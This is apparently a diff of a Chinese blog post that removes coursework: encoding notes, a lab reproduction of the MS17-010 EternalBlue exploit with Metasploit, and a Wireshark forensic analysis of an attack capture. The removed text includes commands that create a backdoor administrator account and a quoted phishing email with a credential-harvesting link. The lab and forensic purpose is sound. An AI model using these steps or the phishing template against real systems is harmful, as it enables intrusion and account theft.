@@ -217,7 +217,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -283,7 +283,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2021-02-01 14:34:17 / 修改时间：17:05:15" itemprop="dateCreated datePublished" datetime="2021-02-01T14:34:17+08:00">2021-02-01</time>
+      <time title="创建时间：2021-02-01 14:34:17 / 修改时间：17:05:22" itemprop="dateCreated datePublished" datetime="2021-02-01T14:34:17+08:00">2021-02-01</time>
     </span>
 
   
@@ -449,7 +449,7 @@
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-01-04 17:17:07" itemprop="dateModified" datetime="2021-01-04T17:17:07+08:00">2021-01-04</time>
+        <time title="修改时间：2021-02-01 17:08:04" itemprop="dateModified" datetime="2021-02-01T17:08:04+08:00">2021-02-01</time>
       </span>
 
   
@@ -462,743 +462,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <a id="more"></a>
-
-<h2 id="培养方案比较"><a href="#培养方案比较" class="headerlink" title="培养方案比较"></a>培养方案比较</h2><p>培养方案的获取主要通过各高校的学院官网获得。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214090506931.png" alt="image-20201214090506931"></p>
-<p>一共选取了上海交通大学、北航、浙大三所学校，各自的专业主干课程如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">上交：</span><br><span class="line">计算机组成与系统结构</span><br><span class="line">软件工程</span><br><span class="line">网络信息安全概论</span><br><span class="line">信息安全的数学基础（1）</span><br><span class="line">信号与系统（B类)</span><br><span class="line">数据库原理</span><br><span class="line">编译原理（C类)</span><br><span class="line">数字信号处理（E类)计算机通信网络(A类)信息论与编码</span><br><span class="line">数字系统设计</span><br><span class="line">信息安全的数学基础（2)</span><br><span class="line">嵌入式系统原理与应用</span><br><span class="line">Windows安全原理与技术</span><br><span class="line">现代密码学</span><br><span class="line">操作系统(B类)</span><br><span class="line">lnternet安全协议与分析</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>北航：</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214091223972.png" alt="image-20201214091223972"></p>
-<p>浙大</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214091332209.png" alt="image-20201214091332209"></p>
-<p>比较和建议：</p>
-<p>与上面这些学校相比，在基础课和专业课程的设置上来说，是没有太大差别。但是，从涉及的广度、深度来说还是有所不及。</p>
-<p>建议开设一些主要以介绍目前的新技术、新思想的课程用于开拓眼界、提升能力。专业课的深度要有所提高，提高实战比例。</p>
-<h2 id="编码参考文档"><a href="#编码参考文档" class="headerlink" title="编码参考文档"></a>编码参考文档</h2><h3 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h3><p><code>Unicode</code>是一个编码方案，<code>Unicode</code>是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。<code>Unicode</code>编码共有三种具体实现，分别为<code>utf-8,utf-16,utf-32</code>.</p>
-<p><code>Unicode</code>没有规定字符对应的二进制码如何存储。以汉字“汉”为例，它的<code>Unicode</code>码点是<code>0x6c49</code>，对应的二进制数是 <code>110110001001001</code>，二进制数有 <code>15 </code>位，这也就说明了它至少需要<code> 2</code> 个字节来表示。可以想象，在<code>Unicode</code>字典中往后的字符可能就需要3个字节或者4个字节，甚至更多字节来表示了。</p>
-<p>为了较好的解决<code>Unicode</code>的编码问题，<code>UTF-8</code>和<code>UTF-16</code>两种当前比较流行的编码方式诞生了。当然还有一个<code>UTF-32</code>的编码方式，也就是上述那种定长编码，字符统一使用 4 个字节，虽然看似方便，但是却不如另外两种编码方式使用广泛。</p>
-<h5 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h5><p><code>UTF-8</code>实现了对<code>ASCII</code>码的向后兼容，以保证<code>Unicode</code>可以被大众接受。</p>
-<p><code>UTF-8</code>是目前互联网上使用最广泛的一种<code>Unicode</code>编码方式，它的最大特点就是可变长。它可以使用<code>1 - 4</code>个字节表示一个字符，根据字符的不同变换长度。编码规则如下：</p>
-<ol>
-<li>对于单个字节的字符，第一位设为 0，后面的 7 位对应这个字符的 Unicode 码点。因此，对于英文中的 0 - 127 号字符，与 ASCII 码完全相同。这意味着 ASCII 码那个年代的文档用 UTF-8 编码打开完全没有问题。</li>
-<li>对于需要使用 N 个字节来表示的字符（N &gt; 1），第一个字节的前 N 位都设为 1，第<code>N + 1</code>位设为0，剩余的<code>N - 1</code>个字节的前两位都设位 10，剩下的二进制位则使用这个字符的 Unicode 码点来填充。</li>
-</ol>
-<p>编码规则如下：</p>
-<table>
-<thead>
-<tr>
-<th align="left">Unicode 十六进制码点范围</th>
-<th align="left">UTF-8 二进制</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">0000 0000 - 0000 007F</td>
-<td align="left">0xxxxxxx</td>
-</tr>
-<tr>
-<td align="left">0000 0080 - 0000 07FF</td>
-<td align="left">110xxxxx 10xxxxxx</td>
-</tr>
-<tr>
-<td align="left">0000 0800 - 0000 FFFF</td>
-<td align="left">1110xxxx 10xxxxxx 10xxxxxx</td>
-</tr>
-<tr>
-<td align="left">0001 0000 - 0010 FFFF</td>
-<td align="left">11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</td>
-</tr>
-</tbody></table>
-<h5 id="UTF-16"><a href="#UTF-16" class="headerlink" title="UTF-16"></a>UTF-16</h5><p>在了解<code>UTF-16</code>编码方式之前，先了解一下另外一个概念——**”平面”**。</p>
-<p>在上面的介绍中，提到了<code>Unicode</code>是一本很厚的字典，她将全世界所有的字符定义在一个集合里。这么多的字符不是一次性定义的，而是分区定义。每个区可以存放 65536 个（$2^{16}$）字符，称为一个平面（plane）。目前，一共有 17 个（$2^{5}$）平面，也就是说，整个 Unicode 字符集的大小现在是 $2^{21}$。</p>
-<p>最前面的 65536 个字符位，称为基本平面（简称 BMP ），它的码点范围是从 0 到 $2^{16}-1$，写成 16 进制就是从 U+0000 到 U+FFFF。所有最常见的字符都放在这个平面，这是 Unicode 最先定义和公布的一个平面。剩下的字符都放在辅助平面（简称 SMP ），码点范围从 U+010000 到 U+10FFFF。</p>
-<p>基本了解了平面的概念后，再说回到 UTF-16。UTF-16 编码介于 UTF-32 与 UTF-8 之间，同时结合了定长和变长两种编码方法的特点。它的编码规则很简单：基本平面的字符占用 2 个字节，辅助平面的字符占用 4 个字节。也就是说，UTF-16 的编码长度要么是 2 个字节（U+0000 到 U+FFFF），要么是 4 个字节（U+010000 到 U+10FFFF）。那么问题来了，当我们遇到两个字节时，到底是把这两个字节当作一个字符还是与后面的两个字节一起当作一个字符呢？</p>
-<p>这里有一个很巧妙的地方，在基本平面内，从 <strong>U+D800</strong> 到 <strong>U+DFFF</strong> 是一个空段，即这些码点不对应任何字符。因此，这个空段可以用来映射辅助平面的字符。</p>
-<p>辅助平面的字符位共有 $2^{20}$ 个，因此表示这些字符至少需要 20 个二进制位。UTF-16 将这 20 个二进制位分成两半，前 10 位映射在 U+D800 到 U+DBFF，称为高位（H），后 10 位映射在 U+DC00 到 U+DFFF，称为低位（L）。这意味着，一个辅助平面的字符，被拆成两个基本平面的字符表示。</p>
-<p>因此，当我们遇到两个字节，发现它的码点在 U+D800 到 U+DBFF 之间，就可以断定，紧跟在后面的两个字节的码点，应该在 U+DC00 到 U+DFFF 之间，这四个字节必须放在一起解读。</p>
-<p>接下来，以汉字”𠮷”为例，说明 UTF-16 编码方式是如何工作的。</p>
-<p>汉字”𠮷”的 Unicode 码点为 <code>0x20BB7</code>，该码点显然超出了基本平面的范围（0x0000 - 0xFFFF），因此需要使用四个字节表示。首先用 <code>0x20BB7 - 0x10000</code> 计算出超出的部分，然后将其用 20 个二进制位表示（不足前面补 0 ），结果为<code>0001000010 1110110111</code>。接着，将前 10 位映射到 U+D800 到 U+DBFF 之间，后 10 位映射到 U+DC00 到 U+DFFF 即可。<code>U+D800</code> 对应的二进制数为 <code>1101100000000000</code>，直接填充后面的 10 个二进制位即可，得到 <code>1101100001000010</code>，转成 16 进制数则为 <code>0xD842</code>。同理可得，低位为 <code>0xDFB7</code>。因此得出汉字”𠮷”的<code>UTF-16</code>编码为 <code>0xD842 0xDFB7</code>。</p>
-<h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p><code>base64</code>编码的数据转换成二进制每个字符只有<code>8</code>位，那么<code>base64</code>编码表就共有<code>2^8</code>即<code>64</code>个对应：</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/2000534-f4d27b41c1297902.png"></p>
-<p>下面用一个例子来说明加密的过程：</p>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">- 首先取ABC对应的ASCII码值</span><br><span class="line">A : 65、B : 66、C : 67</span><br><span class="line">- 再取二进制值</span><br><span class="line">A : 01000001、B : 01000010、C : 01000011</span><br><span class="line">- 然后把这三个字节的二进制码接起来</span><br><span class="line">010000010100001001000011</span><br><span class="line">- 再以6位为单位分成4个数据块并在最高位填充两个0后形成4个字节的编码后的值</span><br><span class="line">00010000、00010100、00001001、00000011</span><br><span class="line">- 再把这4个字节数据转化成10进制数</span><br><span class="line">16、20、19、3</span><br><span class="line">- 最后根据Base64给出的64个基本字符表，查出对应的ASCII码字符</span><br><span class="line">Q、U、J、D</span><br><span class="line">这里的值实际就是数据在字符表中的索引。</span><br><span class="line">解码过程就是把4个字节再还原成3个字节再根据不同的数据形式把字节数组重新整理成数据。</span><br></pre></td></tr></table></figure>
-
-<p>这样的话，<code>3</code>个普通字符就可以编码成<code>4</code>个<code>base64</code>编码后的字符，所以我们通常是以<code>4</code>个编码字符为单位的。</p>
-<p>当<code>n=0 mod 3</code>时：可以完全编码成<code>base64</code>字符。</p>
-<p>当<code>n=1 mod 3</code>时：第一个字符的前<code>6</code>位二进制被编码成一个<code>base64</code>字符，剩下的两位用<code>0</code>补齐之后再编码成<code>base64</code>字符。因为是以<code>4</code>个为单位，缺的用<code>=</code>补齐。</p>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A</span><br><span class="line">010000 010000</span><br><span class="line">QQ==</span><br></pre></td></tr></table></figure>
-
-<p>当<code>n=2 mod 3</code>时：共<code>8*2=16</code>位二进制，编码后剩下<code>2</code>位用<code>0</code>补齐进行编码，则就有<code>3</code>个编码字符串了。然后再用<code>=</code>凑齐<code>4</code>个。</p>
-<p>解码时原理一样。</p>
-<h3 id="ASCII编码"><a href="#ASCII编码" class="headerlink" title="ASCII编码"></a>ASCII编码</h3><p><code>ASCII</code>码使用指定的7 位或8 位二进制数组合来表示128 或256 种可能的字符。标准ASCII 码也叫基础ASCII码，使用7 位二进制数，剩下的1位二进制为0）来表示所有的大写和小写字母，数字0 到9、标点符号，以及在美式英语中使用的特殊控制字符。</p>
-<p>0～31及127(共33个)是控制字符或通信专用字符（其余为可显示字符），如控制符：<code>LF</code>（换行）、<code>CR</code>、<code>FF</code>（换页）、<code>DEL</code>（删除）、<code>BS</code>（退格)、<code>BEL</code>（响铃）等；通信专用字符：<code>SOH</code>（文头）、<code>EOT</code>（文尾）、<code>ACK</code>（确认）等；ASCII值为8、9、10 和13 分别转换为退格、制表、换行和回车字符。它们并没有特定的图形显示，但会依不同的应用程序，而对文本显示有不同的影响 。</p>
-<p><code>32～126</code>(共95个)是字符（32是空格），其中<code>48～57</code>为0到9十个阿拉伯数字。</p>
-<p><code>65～90</code>为26个大写英文字母，<code>97～122</code>号为26个小写英文字母，其余为一些标点符号、运算符号等。</p>
-<p>后<code>128</code>个称为拓展<code>ascii</code>码。许多基于<code>x86</code>的系统都支持使用扩展<code>ASCII</code>。扩展<code>ASCII</code>码允许将每个字符的第8 位用于确定附加的<code>128 </code>个特殊符号字符、外来语字母和图形符号。小写字母的<code>ASCII</code>码值比大写字母<code>ASCII</code>码值大<code>32</code>。</p>
-<h3 id="url-编码"><a href="#url-编码" class="headerlink" title="url 编码"></a>url 编码</h3><p><code>URL</code>编码遵循下列规则：每对<code>name/value</code>由<code>&amp;;</code>符分开；每对来自表单的<code>name/value</code>由=符分开，如果用户没有输入值给这个<code>name</code>，那么这个<code>name</code>还是出现，只是无值。任何特殊的字符（就是那些不是简单的七位<code>ASCII</code>，如汉字）将以百分符<code>%</code>用十六进制编码，当然也包括象 <code>=,&amp;;</code>和<code>%</code>这些特殊的字符。其实<code>url</code>编码就是一个字符<code>ascii</code>码的十六进制。不过稍微有些变动，需要在前面加上“%”。比如<code>\</code>，它的<code>ascii</code>码是<code>92</code>，<code>92</code>的十六进制是<code>5c</code>，所以<code>\</code>的<code>url</code>编码就是<code>%5c</code>。</p>
-<p>简单来讲，<code>url</code>编码是<code>%</code>+<code>ascii</code>码的十六进制表示形式。目的是为了防止<code>url</code>内的特殊字符引起歧义。</p>
-<h2 id="ms17-010-永恒之蓝-漏洞复现"><a href="#ms17-010-永恒之蓝-漏洞复现" class="headerlink" title="ms17-010(永恒之蓝)漏洞复现"></a>ms17-010(永恒之蓝)漏洞复现</h2><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><ul>
-<li>虚拟机环境：VMware Workstation 16 pro</li>
-<li>网络模式：NAT</li>
-<li>攻击机：kali Linux  IP：192.168.204.133</li>
-<li>靶机：Windows 7 X64 IP：192.168.204.131</li>
-</ul>
-<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p>通过nmap对192.168.204.0/24 这个网段扫描发现是否有存在ms17-010漏洞的主机。</p>
-<ol>
-<li>找到nmap关于ms17-010的扫描脚本</li>
-</ol>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210215527241.png" alt="image-20201210215527241"></p>
-<p>指令说明：</p>
-<ul>
-<li>whereis 用于查找文件</li>
-<li>locate 用于查找符合条件的文档，这里就是查找包含ms17-010的文件的路径</li>
-</ul>
-<ol start="2">
-<li>使用脚本扫描整个网段</li>
-</ol>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210220203102.png" alt="image-20201210220203102"></p>
-<p>找到了有ms17-010漏洞的主机，也就是设定的靶机。</p>
-<h4 id="使用Metasploit进行攻击（渗透攻击阶段）"><a href="#使用Metasploit进行攻击（渗透攻击阶段）" class="headerlink" title="使用Metasploit进行攻击（渗透攻击阶段）"></a>使用Metasploit进行攻击（渗透攻击阶段）</h4><ol>
-<li><p>进入msf框架，找到ms17-010攻击模块。</p>
-<p>1.1 输入<code>msfconsole</code>启动Metasploit</p>
-</li>
-</ol>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210220714731.png" alt="image-20201210220714731"></p>
-<p>​    1.2 输入<code>search ms17-010</code>查找永恒之蓝漏洞</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210221132117.png" alt="image-20201210221132117"></p>
-<p>可以看到有5个模块，其中auxiliary/scanner/smb/smb_ms17_010是扫描MS17-010永恒之蓝的模块，扫描或者说检查目标主机是否存在MS17-010永恒之蓝的漏洞（上文已使用nmap进行扫描）。exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码的模块.</p>
-<ol start="2">
-<li><p>使用ms17-010攻击模块，对靶机Win7进行攻击</p>
-<p>1.1 输入<code>use exploit/windows/smb/ms17_010_eternalblue</code>，进入攻击模块</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210221416159.png" alt="image-20201210221416159"></p>
-<p>1.2输入<code>options</code> 查看需要设置的内容<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210221535375.png" alt="image-20201210221535375"></p>
-<p>1.3设置目标主机的IP<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210221905461.png" alt="image-20201210221905461"></p>
-<p>1.4设置payload（攻击载荷）<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210222413306.png" alt="image-20201210222413306"></p>
-<p>选择与目标主机建立反向连接，输入<code>run</code>开始攻击。</p>
-<p>成功后，输入shell。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210230012261.png" alt="image-20201210230012261"></p>
-<p>这里出现错误，上网查找后升级更新解决问题。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210230156170.png" alt="image-20201210230156170"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210230115985.png" alt="image-20201210230115985"></p>
-</li>
-</ol>
-<h4 id="后渗透攻击阶段"><a href="#后渗透攻击阶段" class="headerlink" title="后渗透攻击阶段"></a>后渗透攻击阶段</h4><p>   创建一个用户并提权为管理员。</p>
-<ol>
-<li><p>创建用户</p>
-<p>输入<code>net user test test /add</code>，创建一个名为test，密码为test的普通用户。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210232006046.png" alt="image-20201210232006046"></p>
-<ol start="2">
-<li><p>提升权限</p>
-<p>输入<code>net localgroup administrators test /add    </code>。<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210232719373.png" alt="image-20201210232719373"></p>
-</li>
-</ol>
-</li>
-</ol>
-<pre><code>   3. 验证</code></pre>
-<p>   <img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201210232748811.png" alt="image-20201210232748811"></p>
-<h1 id="作业二"><a href="#作业二" class="headerlink" title="作业二"></a>作业二</h1><h2 id="1-数据分析"><a href="#1-数据分析" class="headerlink" title="1 数据分析"></a>1 数据分析</h2><h2 id="练习题目-2"><a href="#练习题目-2" class="headerlink" title="练习题目 2"></a>练习题目 2</h2><p>整个题目数据包只有两个，比较少。为了方便分析，先将两个数据包合并。</p>
-<p>首先，【统计】——【协议分级】查看一下整体的协议状态。</p>
-<p>可以看到主要是http协议、少量的smtp</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212211548300.png" alt="image-20201212211548300"></p>
-<p>然后【统计】——【http】——【请求】查看http的请求情况。</p>
-<p>在关于网站crm.t3sec.cc:8081的请求中可以清楚的看到<code>vulnweb.com </code>、<code>acunetix</code>等特征,可以判断使用了<code>awvs</code>进行扫描。同时还有sql注入的操作，猜测使用sqlmap，筛选一下<code>tcp contains sqlmap</code>.</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212212054188.png" alt="image-20201212212054188"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212231459988.png" alt="image-20201212231459988"></p>
-<p>使用<code>http contains acunetix </code>筛选</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212212310598.png" alt="image-20201212212310598"></p>
-<p>可以判断攻击者的IP为111.206.82.164。</p>
-<p>继续筛选一些比较敏感的http请求，比如登录，且IP锁定为攻击者。使用<code>http contains login &amp;&amp; ip.src== 111.206.82.164</code>.</p>
-<p>发现111.206.82.164有大量的登录请求。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212213116536.png" alt="image-20201212213116536"></p>
-<p>随便找一个，具体查看</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212213337698.png"></p>
-<p>可以知道内网<code>ip</code>中<code>172.16.61.206</code>对应的外网<code>host</code>为<code>http://crm.t3sec.cc:8081</code>。</p>
-<p>更进一步过滤攻击者的攻击操作。使用<code>ip.dst == 172.16.61.206 &amp;&amp; http &amp;&amp; ip.src == 111.206.82.164 &amp;&amp; http</code></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212213819469.png" alt="image-20201212213819469"></p>
-<p>应该是在进行爆破。</p>
-<p>继续之前的<code>http contains login &amp;&amp; ip.src== 111.206.82.164</code>.可以发现，还有登录<code>172.16.60.200</code>的操作，根据url判断这应该是一个<code>webmail</code>登录服务器。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212214148017.png" alt="image-20201212214148017"></p>
-<p>可以发现攻击者在尝试登录邮箱。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212214731854.png" alt="image-20201212214731854"></p>
-<p>进一步将范围放大，查看<code>http &amp;&amp; ip.src== 111.206.82.164</code></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212215231335.png" alt="image-20201212215231335"></p>
-<p>可以发现使用cookie中带有<code>lixiaofei@t3sec.cc</code>，猜测已经被窃取了账户。进一步查看回显。<code>http &amp;&amp; ip.addr== 111.206.82.164</code>可以发现登录成功。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212220532176.png" alt="image-20201212220532176"></p>
-<p>在附近，可以找到登录成功后显示的界面。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212221215012.png" alt="image-20201212221215012"></p>
-<p>所以，确定攻击者得到了<code>lixiaofei@t3sec.com</code>的账户。同理可以知道<a href="mailto:&#x69;&#116;&#64;&#116;&#x33;&#115;&#101;&#x63;&#x2e;&#x63;&#x63;">&#x69;&#116;&#64;&#116;&#x33;&#115;&#101;&#x63;&#x2e;&#x63;&#x63;</a>已被窃取。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212222146833.png" alt="image-20201212222146833"></p>
-<p>继续筛选攻击者的攻击行为<code>ip.src == 111.206.82.164 &amp;&amp; http &amp;&amp; not(ip.dst == 172.16.61.206) &amp;&amp; not(ip.dst == 172.16.60.200)</code>。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212222611338.png" alt="image-20201212222611338"></p>
-<p>可以得到两条映射关系。</p>
-<p>继续过滤为post。<code>ip.src == 111.206.82.164 &amp;&amp; http &amp;&amp; not(ip.dst == 172.16.61.206) &amp;&amp; not(ip.dst == 172.16.60.200) &amp;&amp; http.request.method == &quot;POST&quot;</code></p>
-<p>发现对发现有对<code>172.16.61.199</code>的登录和文件上传操作。上传的文件php，追踪流可以看到内容。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212223943018.png" alt="image-20201212223943018"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212223546925.png" alt="image-20201212223546925"></p>
-<p>是一个大马，说明拿到了<code>172.16.61.199</code>的权限。结合之前的登录操作，可以知道泄露的账号：</p>
-<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username: lixiaofei</span><br><span class="line">passwd	: lixiaofei</span><br><span class="line">username: admin</span><br><span class="line">passwd	: admin888</span><br></pre></td></tr></table></figure>
-
-<p>接下是查看SMTP协议。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212224125405.png" alt="image-20201212224125405"></p>
-<p>可以发现，主要有两个邮箱发送邮件。<a href="mailto:&#x78;&#x73;&#x73;&#x65;&#114;&#x40;&#108;&#105;&#x76;&#101;&#x2e;&#99;&#x6e;">&#x78;&#x73;&#x73;&#x65;&#114;&#x40;&#108;&#105;&#x76;&#101;&#x2e;&#99;&#x6e;</a>和clickjacking@163.com。</p>
-<p>分别追踪tcp流</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212224338790.png" alt="image-20201212224338790"></p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212224909181.png" alt="image-20201212224909181"></p>
-<p>发现都是将钓鱼邮件发送给了<code>it@t3sec.com</code>和<code>lixiaofei@t3sec.cn</code>，而且邮件内容一致，如下：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=gb2312&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span><span class="xml"><span class="comment">&lt;!-- P &#123;margin-top:0;margin-bottom:0;&#125; --&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">dir</span>=<span class="string">&quot;ltr&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;divtagdefaultwrapper&quot;</span> <span class="attr">style</span>=<span class="string">&quot;font-size:12pt;color:#000000;background-color:#FFFFFF;font-family:Calibri,Arial,Helvetica,sans-serif;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;line-height:1.7;color:#000000;font-size:14px;font-family:Arial&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>大家好。<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span> 鉴于公司网络架构改动，部分应用需要升级，旧版本mail、oa、crm等系统逐步将替换，请大家登录<span class="tag">&lt;<span class="name">a</span> <span class="attr">_src</span>=<span class="string">&quot;http://118.194.196.232:8084/get.php&quot;</span> <span class="attr">href</span>=<span class="string">&quot;http://118.194.196.232:8084/get.php&quot;</span>&gt;</span>http://118.194.196.232:8084/get.php<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 填写自己的帐号以便配合系统升级。</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span><span class="symbol">&amp;nbsp;</span> 谢谢大家！ <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>钓鱼邮件中的<code>118.194.196.232:8084</code>由之前发现映射关系可以知道对应内网的<code>172.16.60.195:80</code>。</p>
-<p>如果用户点击了钓鱼邮件中的链接的话，对于<code>172.16.60.195:80</code>请求头中肯定会携带<code>webmail</code>的<code>cookie</code>，过滤一下对<code>172.16.60.195:80</code>的请求。</p>
-<p><code>(ip.src == 111.206.82.164 &amp;&amp; http &amp;&amp; ip.dst == 172.16.60.195) || (ip.dst == 111.206.82.164 &amp;&amp; http &amp;&amp; ip.src == 172.16.60.195)</code>。</p>
-<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212225432765.png" alt="image-20201212225432765"></p>
